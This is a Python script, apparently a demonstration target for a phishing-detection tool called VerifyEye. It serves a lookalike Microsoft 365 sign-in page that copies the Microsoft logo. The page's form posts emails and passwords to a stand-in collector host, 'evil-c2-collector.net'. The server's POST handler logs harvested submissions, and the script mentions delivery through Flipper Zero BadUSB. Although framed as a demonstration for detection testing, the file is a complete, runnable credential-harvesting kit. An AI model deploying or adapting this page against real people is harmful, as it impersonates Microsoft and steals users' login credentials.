#!/usr/bin/env python3
"""Lightweight mock credential harvesting portal for VerifyEye demonstration.

Serves an authentic-looking Microsoft 365 SSO portal that posts to an
external off-domain harvesting action endpoint, simulating a zero-hour
phishing landing page delivered via Flipper Zero BadUSB or Evil Portal.
"""

import argparse
import http.server
import socketserver

HTML_PAYLOAD = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account - Microsoft 365</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            color: #f8fafc;
        }
        .login-card {
            background: rgba(30, 41, 59, 0.85);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 40px;
            width: 380px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
        }
        .logo-box {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 24px;
        }
        .logo-box h2 {
            margin: 0;
            font-size: 1.4rem;
            color: #38bdf8;
            font-weight: 600;
        }
        .subtitle {
            color: #94a3b8;
            font-size: 0.95rem;
            margin-bottom: 28px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 0.85rem;
            margin-bottom: 8px;
            color: #cbd5e1;
        }
        input {
            width: 100%;
            box-sizing: border-box;
            padding: 12px 14px;
            border-radius: 6px;
            border: 1px solid #475569;
            background: #0f172a;
            color: #fff;
            font-size: 0.95rem;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #38bdf8;
        }
        .btn-submit {
            width: 100%;
            padding: 12px;
            background: #0284c7;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        .btn-submit:hover {
            background: #0369a1;
        }
        .footer {
            margin-top: 24px;
            font-size: 0.8rem;
            color: #64748b;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo-box">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <rect width="11" height="11" fill="#f25022"/>
                <rect x="13" width="11" height="11" fill="#7fba00"/>
                <rect y="13" width="11" height="11" fill="#00a4ef"/>
                <rect x="13" y="13" width="11" height="11" fill="#ffb900"/>
            </svg>
            <h2>Microsoft 365</h2>
        </div>
        <div class="subtitle">Sign in to your account to continue</div>
        
        <!-- Malicious harvesting form: posts to external off-domain API -->
        <form action="http://evil-c2-collector.net/api/v1/harvest" method="POST">
            <div class="form-group">
                <label for="username">Email, phone, or Skype</label>
                <input type="email" id="username" name="email" placeholder="user@company.com" required autocomplete="off">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="••••••••" required>
            </div>
            <button type="submit" class="btn-submit">Sign in</button>
        </form>

        <div class="footer">
            Protected by Enterprise Identity Safeguard (Simulated Ingress Target)
        </div>
    </div>
</body>
</html>
"""

class PortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(HTML_PAYLOAD.encode("utf-8"))))
        self.end_headers()
        self.wfile.write(HTML_PAYLOAD.encode("utf-8"))

    def do_POST(self):
        # Even if credentials submit here, return 200 OK
        content_len = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_len) if content_len > 0 else b""
        print(f"[!] Harvested submission: {post_data.decode('utf-8', errors='ignore')}")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status": "captured"}')

    def log_message(self, format, *args):
        print(f"[MockPortal] {self.address_string()} - {format % args}")


def main():
    parser = argparse.ArgumentParser(description="Mock Credential Portal for VerifyEye Demo")
    parser.add_argument("--port", type=int, default=8080, help="Port to serve portal on (default: 8080)")
    parser.add_argument("--host", default="0.0.0.0", help="Host interface (default: 0.0.0.0)")
    args = parser.parse_args()

    server_address = (args.host, args.port)
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.ThreadingTCPServer(server_address, PortalHandler) as httpd:
        print(f"[+] Mock Phishing Portal live at http://{args.host}:{args.port}/login.html")
        print("[+] Point Flipper Zero BadUSB or VerifyEye crawler here.")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[-] Shutting down portal.")

if __name__ == "__main__":
    main()
